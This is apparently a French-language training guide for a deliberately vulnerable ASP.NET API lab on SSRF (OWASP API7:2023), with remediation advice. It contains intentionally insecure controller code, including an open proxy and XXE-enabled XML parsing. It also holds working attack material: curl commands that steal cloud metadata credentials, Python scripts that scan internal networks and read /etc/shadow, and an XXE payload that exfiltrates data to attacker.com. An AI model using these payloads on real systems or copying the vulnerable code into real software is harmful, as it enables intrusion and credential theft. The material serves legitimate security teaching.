# API7:2023 - Server Side Request Forgery (SSRF)

## 📋 Description de la vulnérabilité

La vulnérabilité **Server Side Request Forgery (SSRF)** permet à un attaquant de faire effectuer des requêtes HTTP par le serveur vers des ressources internes ou externes arbitraires. Cette vulnérabilité peut être utilisée pour accéder à des services internes, scanner le réseau interne, ou exfiltrer des données sensibles.

### Impact potentiel
- Accès aux services internes (bases de données, APIs internes)
- Scan du réseau interne et découverte de services
- Lecture de fichiers locaux (file://)
- Exfiltration de données via des requêtes externes
- Contournement de pare-feu et de contrôles d'accès réseau
- Attaques sur les services cloud (metadata endpoints)

## 🎯 Endpoints vulnérables

Le contrôleur `Api07SsrfController` expose de nombreux endpoints vulnérables à SSRF :

### 1. **Import d'images**
- `POST /api/ssrf/image/import` - Import d'image depuis URL arbitraire

### 2. **Webhooks et callbacks**
- `POST /api/ssrf/webhook/configure` - Configuration de webhook sans validation
- `POST /api/ssrf/oauth/callback-test` - Test de callback OAuth

### 3. **Proxy et fetch de contenu**
- `GET /api/ssrf/proxy?url=...` - Proxy ouvert vers n'importe quelle URL
- `POST /api/ssrf/metadata/fetch` - Récupération de métadonnées

### 4. **Génération de PDF**
- `POST /api/ssrf/pdf/generate` - Génération avec contenu externe

### 5. **Validation d'URL et DNS**
- `POST /api/ssrf/url/validate` - Résolution DNS et scan de ports

### 6. **Import/Export de données**
- `POST /api/ssrf/data/import` - Import depuis URL externe
- `POST /api/ssrf/data/export` - Export vers URL externe

### 7. **Services internes**
- `POST /api/ssrf/internal/service-call` - Appel de services internes

### 8. **RSS/XML**
- `POST /api/ssrf/rss/aggregate` - Agrégation de flux RSS (XXE possible)

### 9. **Webhooks**
- `POST /api/ssrf/webhook/receive` - Réception et traitement sans validation

### 10. **Agrégation d'APIs**
- `POST /api/ssrf/aggregate` - Agrégation multiple sans contrôle

### 11. **Social Media et Upload**
- `POST /api/ssrf/social/post` - Post sur réseaux sociaux
- `POST /api/ssrf/file/upload` - Upload vers services externes

## 🔍 Code vulnérable expliqué

### Exemple 1 : Import d'image sans validation

```csharp
[HttpPost("image/import")]
public async Task<IActionResult> ImportImageFromUrl([FromBody] ImageImportRequest request)
{
    try
    {
        // VULNÉRABLE: Pas de validation de l'URL
        // VULNÉRABLE: Pas de vérification du schéma (file://, gopher://, etc.)
        // VULNÉRABLE: Pas de vérification de l'hôte (localhost, IP internes)

        var response = await _httpClient.GetAsync(request.ImageUrl);
        var imageBytes = await response.Content.ReadAsByteArrayAsync();

        // VULNÉRABLE: Pas de validation du type de contenu
        var fileName = $"imported_{Guid.NewGuid()}.jpg";
        var filePath = Path.Combine(_env.WebRootPath, "uploads", fileName);

        await System.IO.File.WriteAllBytesAsync(filePath, imageBytes);

        // VULNÉRABLE: Exposition d'informations sur l'infrastructure
        return Ok(new
        {
            message = "Image imported successfully",
            fileName = fileName,
            size = imageBytes.Length,
            serverInfo = new
            {
                machineName = Environment.MachineName,
                osVersion = Environment.OSVersion.ToString(),
                processorCount = Environment.ProcessorCount
            }
        });
    }
    catch (Exception ex)
    {
        // VULNÉRABLE: Message d'erreur détaillé révélant la structure interne
        return BadRequest(new
        {
            error = "Failed to import image",
            details = ex.Message,
            stackTrace = ex.StackTrace,
            innerException = ex.InnerException?.Message
        });
    }
}
```

**Problèmes** :
- Accepte n'importe quelle URL sans validation
- Permet l'accès aux ressources internes
- Expose des informations système
- Messages d'erreur détaillés

### Exemple 2 : Proxy ouvert

```csharp
[HttpGet("proxy")]
public async Task<IActionResult> ProxyRequest([FromQuery] string url)
{
    try
    {
        // VULNÉRABLE: Aucune validation de l'URL
        // Permet d'accéder à des ressources internes comme:
        // - http://localhost/admin
        // - http://192.168.1.1/
        // - file:///etc/passwd
        // - gopher://internal-server

        var response = await _httpClient.GetAsync(url);
        var content = await response.Content.ReadAsStringAsync();

        // VULNÉRABLE: Retourne le contenu complet
        return Content(content, response.Content.Headers.ContentType?.ToString() ?? "text/plain");
    }
    catch (Exception ex)
    {
        return BadRequest(new { error = ex.Message });
    }
}
```

### Exemple 3 : Validation d'URL avec résolution DNS

```csharp
[HttpPost("url/validate")]
public async Task<IActionResult> ValidateUrl([FromBody] UrlValidationRequest request)
{
    try
    {
        // VULNÉRABLE: Résolution DNS pouvant être utilisée pour scanner le réseau interne
        var uri = new Uri(request.Url);
        var hostEntry = await Dns.GetHostEntryAsync(uri.Host);

        // VULNÉRABLE: Révèle des informations sur le réseau interne
        var ipAddresses = hostEntry.AddressList.Select(ip => ip.ToString()).ToList();

        // VULNÉRABLE: Tentative de connexion pour vérifier l'accessibilité
        var tcpClient = new System.Net.Sockets.TcpClient();
        var isReachable = false;

        try
        {
            await tcpClient.ConnectAsync(uri.Host, uri.Port == -1 ? 80 : uri.Port);
            isReachable = tcpClient.Connected;
            tcpClient.Close();
        }
        catch { }

        return Ok(new
        {
            url = request.Url,
            host = uri.Host,
            ipAddresses = ipAddresses,
            isReachable = isReachable,
            port = uri.Port,
            // VULNÉRABLE: Informations détaillées sur la résolution DNS
            aliases = hostEntry.Aliases,
            hostName = hostEntry.HostName
        });
    }
    catch (Exception ex)
    {
        return BadRequest(new { error = "URL validation failed", details = ex.Message });
    }
}
```

### Exemple 4 : Agrégation de flux RSS avec XXE

```csharp
[HttpPost("rss/aggregate")]
public async Task<IActionResult> AggregateRssFeeds([FromBody] RssAggregation request)
{
    var results = new List<object>();

    foreach (var feedUrl in request.FeedUrls)
    {
        try
        {
            // VULNÉRABLE: Télécharge et parse du XML sans validation
            var response = await _unsafeClient.GetAsync(feedUrl);
            var xml = await response.Content.ReadAsStringAsync();

            // VULNÉRABLE: Parse XML avec des paramètres non sécurisés
            var settings = new XmlReaderSettings
            {
                DtdProcessing = DtdProcessing.Parse, // VULNÉRABLE: XXE possible
                XmlResolver = new XmlUrlResolver(), // VULNÉRABLE: Résolution d'URL externe
                MaxCharactersFromEntities = long.MaxValue
            };

            using var stringReader = new StringReader(xml);
            using var xmlReader = XmlReader.Create(stringReader, settings);

            var feed = SyndicationFeed.Load(xmlReader);

            // VULNÉRABLE: Execute du contenu HTML si demandé
            if (request.ParseHtml)
            {
                foreach (var item in feed.Items)
                {
                    results.Add(new
                    {
                        title = item.Title?.Text,
                        content = item.Content?.ToString(), // VULNÉRABLE: Contenu HTML non sanitisé
                        htmlContent = item.Summary?.Text,
                        links = item.Links?.Select(l => l.Uri?.ToString()),
                        rawXml = item.ToString()
                    });
                }
            }
        }
        catch (Exception ex)
        {
            results.Add(new { error = ex.Message, feed = feedUrl });
        }
    }

    return Ok(new { feeds = results, totalProcessed = request.FeedUrls.Count });
}
```

## 💥 Scénarios d'exploitation

### Scénario 1 : Accès aux métadonnées cloud (AWS/Azure/GCP)
```bash
# AWS - Récupération des credentials IAM
curl -X POST http://localhost:5000/api/ssrf/proxy \
    -H "Content-Type: application/json" \
    -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# Azure - Récupération du token d'accès
curl -X POST http://localhost:5000/api/ssrf/proxy \
    -H "Content-Type: application/json" \
    -d '{"url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"}'

# GCP - Récupération du service account
curl -X POST http://localhost:5000/api/ssrf/proxy \
    -H "Content-Type: application/json" \
    -d '{"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}'
```

### Scénario 2 : Scan du réseau interne
```python
import requests
import ipaddress

def scan_internal_network(base_url, network="192.168.1.0/24"):
    """Scan un réseau interne via SSRF"""
    discovered_services = []
    
    for ip in ipaddress.IPv4Network(network):
        # Test de ports communs
        for port in [22, 80, 443, 3306, 5432, 6379, 8080, 9200]:
            url = f"http://{ip}:{port}"
            
            response = requests.post(
                f"{base_url}/api/ssrf/url/validate",
                json={"url": url}
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get("isReachable"):
                    discovered_services.append({
                        "ip": str(ip),
                        "port": port,
                        "service": guess_service(port)
                    })
                    print(f"Service découvert: {ip}:{port}")
    
    return discovered_services

def guess_service(port):
    services = {
        22: "SSH",
        80: "HTTP",
        443: "HTTPS",
        3306: "MySQL",
        5432: "PostgreSQL",
        6379: "Redis",
        8080: "HTTP-Alt",
        9200: "Elasticsearch"
    }
    return services.get(port, "Unknown")
```

### Scénario 3 : Lecture de fichiers locaux
```python
def read_local_files(base_url):
    """Tente de lire des fichiers locaux via SSRF"""
    sensitive_files = [
        "file:///etc/passwd",
        "file:///etc/shadow",
        "file:///etc/hosts",
        "file:///proc/self/environ",
        "file:///var/log/apache2/access.log",
        "file://C:/Windows/System32/drivers/etc/hosts",
        "file://C:/Windows/win.ini"
    ]
    
    results = {}
    
    for file_url in sensitive_files:
        try:
            response = requests.get(
                f"{base_url}/api/ssrf/proxy",
                params={"url": file_url}
            )
            
            if response.status_code == 200:
                results[file_url] = response.text
                print(f"✓ Fichier lu: {file_url}")
            else:
                print(f"✗ Échec: {file_url}")
        except:
            pass
    
    return results
```

### Scénario 4 : Exploitation via XXE
```xml
<!-- Payload XXE pour exfiltrer des fichiers -->
<!DOCTYPE feed [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY exfil SYSTEM "http://attacker.com/exfil?data=&xxe;">
]>
<rss version="2.0">
  <channel>
    <title>&xxe;</title>
    <link>&exfil;</link>
  </channel>
</rss>
```

### Scénario 5 : Accès aux services internes
```python
def access_internal_services(base_url):
    """Accède aux services internes via SSRF"""
    internal_endpoints = [
        "http://localhost:9200/_cat/indices",  # Elasticsearch
        "http://localhost:15672/api/overview",  # RabbitMQ
        "http://localhost:8086/query?db=metrics",  # InfluxDB
        "http://localhost:2379/v2/keys/",  # etcd
        "http://internal-api.local/v1/users",
        "http://redis.internal:6379/INFO"
    ]
    
    for endpoint in internal_endpoints:
        response = requests.post(
            f"{base_url}/api/ssrf/proxy",
            json={"url": endpoint}
        )
        
        if response.status_code == 200:
            print(f"Accès réussi: {endpoint}")
            print(f"Contenu: {response.text[:200]}...")
```

## 🛡️ Solutions de remédiation

### 1. **Validation stricte des URLs**

```csharp
public class UrlValidator
{
    private readonly HashSet<string> _allowedSchemes = new() { "http", "https" };
    private readonly HashSet<string> _blockedPorts = new() { 22, 23, 25, 110, 135, 139, 445, 3389 };
    private readonly ILogger<UrlValidator> _logger;

    public UrlValidator(ILogger<UrlValidator> logger)
    {
        _logger = logger;
    }

    public ValidationResult ValidateUrl(string url)
    {
        try
        {
            var uri = new Uri(url);

            // Vérifier le schéma
            if (!_allowedSchemes.Contains(uri.Scheme.ToLower()))
            {
                return new ValidationResult(false, "Invalid URL scheme");
            }

            // Bloquer les IPs privées et localhost
            if (IsPrivateOrLocalhost(uri.Host))
            {
                _logger.LogWarning("Blocked access to private IP: {Host}", uri.Host);
                return new ValidationResult(false, "Access to private networks is not allowed");
            }

            // Bloquer les ports sensibles
            var port = uri.Port == -1 ? (uri.Scheme == "https" ? 443 : 80) : uri.Port;
            if (_blockedPorts.Contains(port))
            {
                return new ValidationResult(false, $"Port {port} is not allowed");
            }

            // Vérifier contre une liste blanche de domaines (optionnel)
            if (!IsWhitelistedDomain(uri.Host))
            {
                return new ValidationResult(false, "Domain not whitelisted");
            }

            return new ValidationResult(true, "URL is valid");
        }
        catch (Exception ex)
        {
            return new ValidationResult(false, $"Invalid URL format: {ex.Message}");
        }
    }

    private bool IsPrivateOrLocalhost(string host)
    {
        // Vérifier localhost et variations
        var localhostVariations = new[] { "localhost", "127.0.0.1", "::1", "0.0.0.0" };
        if (localhostVariations.Contains(host.ToLower()))
            return true;

        // Vérifier les IPs privées
        if (IPAddress.TryParse(host, out var ipAddress))
        {
            // RFC1918 private ranges
            var privateRanges = new[]
            {
                new { Start = IPAddress.Parse("10.0.0.0"), End = IPAddress.Parse("10.255.255.255") },
                new { Start = IPAddress.Parse("172.16.0.0"), End = IPAddress.Parse("172.31.255.255") },
                new { Start = IPAddress.Parse("192.168.0.0"), End = IPAddress.Parse("192.168.255.255") },
                new { Start = IPAddress.Parse("169.254.0.0"), End = IPAddress.Parse("169.254.255.255") } // Link-local
            };

            var ipBytes = ipAddress.GetAddressBytes();
            foreach (var range in privateRanges)
            {
                var startBytes = range.Start.GetAddressBytes();
                var endBytes = range.End.GetAddressBytes();

                if (IsInRange(ipBytes, startBytes, endBytes))
                    return true;
            }
        }

        // Résoudre le hostname et vérifier les IPs
        try
        {
            var hostEntry = Dns.GetHostEntry(host);
            foreach (var ip in hostEntry.AddressList)
            {
                if (IsPrivateOrLocalhost(ip.ToString()))
                    return true;
            }
        }
        catch { }

        return false;
    }

    private bool IsInRange(byte[] ip, byte[] start, byte[] end)
    {
        for (int i = 0; i < ip.Length; i++)
        {
            if (ip[i] < start[i]) return false;
            if (ip[i] > start[i]) break;
        }

        for (int i = 0; i < ip.Length; i++)
        {
            if (ip[i] > end[i]) return false;
            if (ip[i] < end[i]) break;
        }

        return true;
    }

    private bool IsWhitelistedDomain(string host)
    {
        var whitelist = new[]
        {
            "api.trusted-partner.com",
            "cdn.example.com",
            "*.amazonaws.com"
        };

        return whitelist.Any(pattern =>
        {
            if (pattern.StartsWith("*."))
            {
                var domain = pattern.Substring(2);
                return host.EndsWith(domain);
            }
            return host.Equals(pattern, StringComparison.OrdinalIgnoreCase);
        });
    }
}
```

### 2. **Client HTTP sécurisé avec restrictions**

```csharp
public class SecureHttpClient
{
    private readonly HttpClient _httpClient;
    private readonly UrlValidator _urlValidator;
    private readonly ILogger<SecureHttpClient> _logger;

    public SecureHttpClient(
        HttpClient httpClient,
        UrlValidator urlValidator,
        ILogger<SecureHttpClient> logger)
    {
        _httpClient = httpClient;
        _urlValidator = urlValidator;
        _logger = logger;

        // Configuration sécurisée
        _httpClient.Timeout = TimeSpan.FromSeconds(10);
        _httpClient.DefaultRequestHeaders.Add("User-Agent", "SecureApp/1.0");
    }

    public async Task<HttpResponseMessage> GetAsync(string url)
    {
        // Valider l'URL
        var validation = _urlValidator.ValidateUrl(url);
        if (!validation.IsValid)
        {
            throw new InvalidOperationException($"URL validation failed: {validation.Message}");
        }

        // Limiter la taille de la réponse
        using var request = new HttpRequestMessage(HttpMethod.Get, url);
        var response = await _httpClient.SendAsync(request, HttpCompletionOption.ResponseHeadersRead);

        // Vérifier la taille du contenu
        if (response.Content.Headers.ContentLength > 10_000_000) // 10MB max
        {
            response.Dispose();
            throw new InvalidOperationException("Response too large");
        }

        return response;
    }
}

// Utilisation dans le contrôleur
[HttpPost("image/import-secure")]
public async Task<IActionResult> ImportImageSecure(
    [FromBody] ImageImportRequest request,
    [FromServices] SecureHttpClient secureClient)
{
    try
    {
        // Validation supplémentaire du type
        if (!request.ImageUrl.EndsWith(".jpg") && 
            !request.ImageUrl.EndsWith(".png") && 
            !request.ImageUrl.EndsWith(".gif"))
        {
            return BadRequest("Only JPG, PNG, and GIF images are allowed");
        }

        var response = await secureClient.GetAsync(request.ImageUrl);

        // Vérifier le Content-Type
        var contentType = response.Content.Headers.ContentType?.MediaType;
        if (!contentType?.StartsWith("image/") ?? true)
        {
            return BadRequest("URL does not point to an image");
        }

        var imageBytes = await response.Content.ReadAsByteArrayAsync();

        // Valider l'image
        using var ms = new MemoryStream(imageBytes);
        using var img = Image.FromStream(ms);

        if (img.Width > 4000 || img.Height > 4000)
        {
            return BadRequest("Image dimensions too large");
        }

        // Sauvegarder avec un nom sécurisé
        var fileName = $"{Guid.NewGuid()}.{img.RawFormat.ToString().ToLower()}";
        var filePath = Path.Combine(_env.WebRootPath, "uploads", fileName);

        await System.IO.File.WriteAllBytesAsync(filePath, imageBytes);

        return Ok(new
        {
            message = "Image imported successfully",
            fileName = fileName,
            size = imageBytes.Length
        });
    }
    catch (Exception ex)
    {
        _logger.LogError(ex, "Failed to import image");
        return BadRequest(new { error = "Failed to import image" });
    }
}
```

### 3. **Parse XML sécurisé (prévention XXE)**

```csharp
public class SecureXmlParser
{
    public async Task<T> ParseXmlAsync<T>(Stream xmlStream) where T : class
    {
        var settings = new XmlReaderSettings
        {
            // Désactiver complètement les DTD
            DtdProcessing = DtdProcessing.Prohibit,
            
            // Désactiver la résolution d'entités externes
            XmlResolver = null,
            
            // Limites de sécurité
            MaxCharactersFromEntities = 1024,
            MaxCharactersInDocument = 1_000_000,
            
            // Validation
            ValidationType = ValidationType.None,
            
            // Autres paramètres de sécurité
            IgnoreComments = true,
            IgnoreProcessingInstructions = true,
            IgnoreWhitespace = true
        };

        using var reader = XmlReader.Create(xmlStream, settings);
        var serializer = new XmlSerializer(typeof(T));
        
        return serializer.Deserialize(reader) as T;
    }
}

// Utilisation pour RSS
[HttpPost("rss/aggregate-secure")]
public async Task<IActionResult> AggregateRssFeedsSecure(
    [FromBody] RssAggregation request,
    [FromServices] SecureHttpClient secureClient,
    [FromServices] SecureXmlParser xmlParser)
{
    var results = new List<object>();

    foreach (var feedUrl in request.FeedUrls.Take(10)) // Limiter à 10 feeds
    {
        try
        {
            var response = await secureClient.GetAsync(feedUrl);
            using var stream = await response.Content.ReadAsStreamAsync();

            // Parser de manière sécurisée
            var feed = await xmlParser.ParseXmlAsync<RssFeed>(stream);

            results.Add(new
            {
                title = HtmlEncoder.Default.Encode(feed.Channel.Title),
                description = HtmlEncoder.Default.Encode(feed.Channel.Description),
                items = feed.Channel.Items.Take(10).Select(item => new
                {
                    title = HtmlEncoder.Default.Encode(item.Title),
                    description = HtmlEncoder.Default.Encode(item.Description),
                    link = item.Link
                })
            });
        }
        catch (Exception ex)
        {
            _logger.LogWarning(ex, "Failed to parse feed: {FeedUrl}", feedUrl);
            results.Add(new { error = "Failed to parse feed", url = feedUrl });
        }
    }

    return Ok(results);
}
```

### 4. **Utilisation d'un proxy inverse pour les requêtes externes**

```csharp
public interface IExternalApiProxy
{
    Task<T> GetAsync<T>(string endpoint, Dictionary<string, string> parameters = null);
}

public class ExternalApiProxy : IExternalApiProxy
{
    private readonly HttpClient _httpClient;
    private readonly IConfiguration _configuration;
    private readonly ILogger<ExternalApiProxy> _logger;

    // Liste des APIs autorisées
    private readonly Dictionary<string, ApiConfig> _allowedApis = new()
    {
        ["weather"] = new ApiConfig 
        { 
            BaseUrl = "https://api.weather.com/v1/",
            RequiresAuth = true,
            RateLimit = 100
        },
        ["geocoding"] = new ApiConfig 
        { 
            BaseUrl = "https://api.geocoding.com/v1/",
            RequiresAuth = true,
            RateLimit = 50
        }
    };

    public async Task<T> GetAsync<T>(string endpoint, Dictionary<string, string> parameters = null)
    {
        // Parser l'endpoint pour extraire l'API et la route
        var parts = endpoint.Split('/', 2);
        if (parts.Length != 2 || !_allowedApis.ContainsKey(parts[0]))
        {
            throw new InvalidOperationException("Invalid API endpoint");
        }

        var apiName = parts[0];
        var route = parts[1];
        var apiConfig = _allowedApis[apiName];

        // Construire l'URL complète
        var url = $"{apiConfig.BaseUrl}{route}";
        
        if (parameters != null && parameters.Any())
        {
            var query = string.Join("&", parameters.Select(kvp => 
                $"{Uri.EscapeDataString(kvp.Key)}={Uri.EscapeDataString(kvp.Value)}"));
            url += $"?{query}";
        }

        // Ajouter l'authentification si nécessaire
        if (apiConfig.RequiresAuth)
        {
            var apiKey = _configuration[$"ExternalApis:{apiName}:ApiKey"];
            _httpClient.DefaultRequestHeaders.Add("X-API-Key", apiKey);
        }

        // Faire la requête
        var response = await _httpClient.GetAsync(url);
        response.EnsureSuccessStatusCode();

        var content = await response.Content.ReadAsStringAsync();
        return JsonSerializer.Deserialize<T>(content);
    }
}

private class ApiConfig
{
    public string BaseUrl { get; set; }
    public bool RequiresAuth { get; set; }
    public int RateLimit { get; set; }
}
```

### 5. **Monitoring et détection SSRF**

```csharp
public class SsrfDetectionMiddleware
{
    private readonly RequestDelegate _next;
    private readonly ILogger<SsrfDetectionMiddleware> _logger;

    public async Task InvokeAsync(HttpContext context)
    {
        // Surveiller les paramètres suspects
        var suspiciousPatterns = new[]
        {
            "localhost",
            "127.0.0.1",
            "169.254.169.254", // AWS metadata
            "metadata.google.internal", // GCP metadata
            "file://",
            "gopher://",
            "dict://",
            "ftp://",
            "sftp://"
        };

        var allParams = context.Request.Query
            .Concat(context.Request.HasFormContentType ? context.Request.Form : new FormCollection(new Dictionary<string, StringValues>()))
            .SelectMany(kvp => kvp.Value);

        foreach (var param in allParams)
        {
            foreach (var pattern in suspiciousPatterns)
            {
                if (param.Contains(pattern, StringComparison.OrdinalIgnoreCase))
                {
                    _logger.LogWarning(
                        "Potential SSRF attempt detected. Pattern: {Pattern}, IP: {IP}, Path: {Path}",
                        pattern,
                        context.Connection.RemoteIpAddress,
                        context.Request.Path
                    );

                    // Optionnel : bloquer la requête
                    context.Response.StatusCode = 400;
                    await context.Response.WriteAsync("Invalid request");
                    return;
                }
            }
        }

        await _next(context);
    }
}
```

## 🔧 Bonnes pratiques

1. **Liste blanche d'URLs** : N'autoriser que des domaines spécifiques
2. **Validation stricte** : Vérifier schéma, hôte, port
3. **Blocage des IPs privées** : Empêcher l'accès au réseau interne
4. **Timeouts courts** : Limiter le temps de réponse
5. **Limitation de taille** : Limiter la taille des réponses
6. **Pas de redirections** : Désactiver le suivi automatique
7. **Parse sécurisé** : Désactiver DTD et entités externes pour XML
8. **Logging** : Enregistrer toutes les requêtes sortantes
9. **Rate limiting** : Limiter le nombre de requêtes
10. **Principe du moindre privilège** : Limiter les accès réseau du serveur

## 📊 Tests de détection

### Test de vulnérabilité SSRF
```python
import requests

def test_ssrf_vulnerabilities(base_url):
    test_cases = [
        {
            "name": "AWS Metadata",
            "url": "http://169.254.169.254/latest/meta-data/",
            "expected": "Blocked"
        },
        {
            "name": "Localhost Access",
            "url": "http://localhost:8080/admin",
            "expected": "Blocked"
        },
        {
            "name": "Internal IP",
            "url": "http://192.168.1.1/",
            "expected": "Blocked"
        },
        {
            "name": "File Protocol",
            "url": "file:///etc/passwd",
            "expected": "Blocked"
        },
        {
            "name": "Gopher Protocol",
            "url": "gopher://localhost:70/",
            "expected": "Blocked"
        },
        {
            "name": "Valid External URL",
            "url": "https://example.com/image.jpg",
            "expected": "Allowed"
        }
    ]
    
    results = []
    
    for test in test_cases:
        try:
            response = requests.post(
                f"{base_url}/api/ssrf/proxy",
                json={"url": test["url"]},
                timeout=5
            )
            
            if response.status_code == 200:
                result = "Allowed"
            else:
                result = "Blocked"
                
            status = "✅" if result == test["expected"] else "❌"
            
            results.append({
                "test": test["name"],
                "result": result,
                "expected": test["expected"],
                "status": status
            })
            
            print(f"{status} {test['name']}: {result} (expected: {test['expected']})")
            
        except Exception as e:
            results.append({
                "test": test["name"],
                "result": "Error",
                "error": str(e)
            })
    
    return results
```

### Scanner de réseau via SSRF
```python
def ssrf_network_scanner(base_url, target_network="192.168.1.0/24"):
    """Teste si le serveur est vulnérable au scan de réseau"""
    import ipaddress
    
    discovered = []
    network = ipaddress.IPv4Network(target_network)
    
    # Test sur quelques IPs seulement pour la démo
    test_ips = list(network.hosts())[:5]
    
    for ip in test_ips:
        for port in [22, 80, 443]:
            url = f"http://{ip}:{port}"
            
            try:
                response = requests.post(
                    f"{base_url}/api/ssrf/url/validate",
                    json={"url": url},
                    timeout=2
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get("isReachable"):
                        discovered.append(f"{ip}:{port}")
                        print(f"❌ VULNÉRABLE: Service interne accessible: {ip}:{port}")
            except:
                pass
    
    if not discovered:
        print("✅ Pas d'accès au réseau interne détecté")
    
    return discovered
```

## ⚠️ Attention

Ce code est **intentionnellement vulnérable** et ne doit **JAMAIS** être utilisé en production. Il sert uniquement à des fins éducatives pour comprendre et apprendre à détecter les vulnérabilités SSRF.

## 📚 Références

- [OWASP API Security Top 10 2023 - SSRF](https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)